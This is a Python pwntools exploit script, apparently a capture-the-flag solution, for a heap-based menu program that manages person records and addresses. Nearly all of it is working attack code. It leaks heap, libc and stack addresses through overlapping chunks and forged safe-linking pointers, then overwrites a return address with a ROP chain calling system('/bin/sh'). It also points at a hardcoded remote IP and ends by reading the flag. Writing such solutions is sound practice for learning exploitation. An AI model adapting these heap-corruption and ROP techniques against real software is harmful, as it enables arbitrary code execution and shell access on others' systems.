#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "68"]
# host, port = '127.0.0.1', 10110 # docker debug
host, port = '65.109.177.124', 10110

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
set max-visualize-chunk-size 0x500

# breakrva 0x01ed3
# breakrva 0x01ee8
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def new_person(idx, id, balance, name=b'n'):
    io.sendline(b'newperson')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', str(id).encode())
    io.sendlineafter(b':', name)
    io.sendlineafter(b':', balance if type(balance) == bytes else str(balance).encode())

def del_person(idx):
    io.sendline(b'delperson')
    io.sendlineafter(b':', str(idx).encode())

def set_order(idx, tag=b't', total=0):
    io.sendline(b'setorder')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', tag)
    io.sendlineafter(b':', str(total).encode())

def show(idx):
    io.sendline(b'show')
    io.sendlineafter(b':', str(idx).encode())

def set_address(idx, length, state=b's', city=b'c', zip=0, number=0, address=b'a'):
    if length <= 0x2ff or length > 0x500:
        log.failure('setaddress: invalid length')
        exit(1)
    io.sendline(b'setaddress')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', str(length).encode())
    io.sendlineafter(b':', state)
    io.sendlineafter(b':', city)
    io.sendlineafter(b':', str(zip).encode())
    io.sendlineafter(b':', number if type(number) == bytes else str(number).encode())
    io.sendlineafter(b':', address)

ENUM_CITY = 2
ENUM_ZIP = 3
ENUM_NUMBER = 4
def edit_address(idx, option, value):
    io.sendline(b'editaddress')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b'>', str(option).encode())
    if option == ENUM_CITY:
        io.sendafter(b':', value)
    else:
        io.sendlineafter(b':', str(value).encode())

def demangle(val):
    mask = 0xfff << 52
    while mask:
        v = val & mask
        val ^= (v >> 12)
        mask >>= 12
    return val

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

heap = 0x0
def exploit():
    global io
    io = initialize()

    # ===========================
    # SETUP HUGE UNSORTED BIN
    # ===========================
    new_person(0, 0, 0)
    new_person(1, 1, 1)
    set_address(0, 0x440)
    set_address(1, 0x440)
    
    set_order(0)
    del_person(0)
    del_person(1)

    new_person(0, 0, b'+')
    new_person(1, 1, 1)
    new_person(2, 2, b'+')
    new_person(3, 3, 3)

    # leak along the way
    show(0)
    io.recvuntil(b'Balance: ')
    heap = demangle(int(io.recvline().strip())) - 0x16c0
    if args.REMOTE:
        heap += 0x410

    # leak along the way
    show(2)
    io.recvuntil(b'Balance: ')
    libc.address = int(io.recvline().strip()) - 0x203f20-0x130

    set_address(2, 0x420-0x40)
    set_address(3, 0x420-0x40)

    del_person(2)
    del_person(3)

    # ===========================
    # CHUNK OVERLAP -> LEAK STACK
    # ===========================
    new_person(4, 4, 4)
    new_person(5, 5, 5)
    set_address(4, 0x410-0x40) if not args.REMOTE else None
    set_address(5, 0x440-0x40)
    new_person(6, 6, 6)

    del_person(5)
    del_person(6)

    edit_address(3, ENUM_ZIP, mangle(heap+0x1bd0, libc.sym['__libc_argv']))
    edit_address(3, ENUM_CITY, b'\x00'*15)

    # consume freelist to profit
    set_order(1)
    new_person(7, 7, b'+')

    show(7)
    io.recvuntil(b'Balance: ')
    stack = int(io.recvline().strip())
    rip = stack - 0x170

    # ===========================
    # SETUP UNSORTED -> CHUNK OVERLAP -> ROP
    # ===========================
    new_person(8, 8, 8)
    new_person(9, 9, 9)
    new_person(10, 10, 10)
    new_person(11, 11, 11)
    new_person(12, 12, 12)
    new_person(13, 13, 13)
    new_person(14, 14, 14)
    new_person(15, 15, 15)

    set_address(8, 0x440)
    set_address(9, 0x440)
    
    # wilderness protect (need a lot cause there's a lot in the bin)
    set_address(10, 0x300) 
    set_order(8)
    set_order(9)
    set_address(14, 0x300)

    del_person(8)
    del_person(9)

    set_address(10, 0x420-0x40)
    set_address(11, 0x420-0x40)
    
    del_person(11)
    del_person(10)

    set_address(12, 0x440-0x40) 
    set_address(13, 0x300)

    set_order(12)

    del_person(14)
    del_person(13)

    edit_address(11, ENUM_ZIP, mangle(heap+0x2480, rip-0x8))
    edit_address(3, ENUM_CITY, b'\x00'*15)

    set_address(12, 0x300)

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret = rop.find_gadget(['ret'])[0]
    # pause()
    set_address(12, 0x300,
        state=p64(stack)+p64(pop_rdi)[:7],
        city=p64(ret) + p64(libc.sym['system'])[:7],
        zip=next(libc.search(b'/bin/sh\x00')),
        number=pop_rdi,
        address=b'\x00',
    )

    io.sendline(b'cat flag*')

    log.info('heap base: %#x', heap)
    log.info('libc base: %#x', libc.address)  
    log.info('libc argv: %#x', libc.sym['__libc_argv']) 
    log.info('stack argv: %#x', stack)
    log.info('rip: %#x', rip-0x8)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
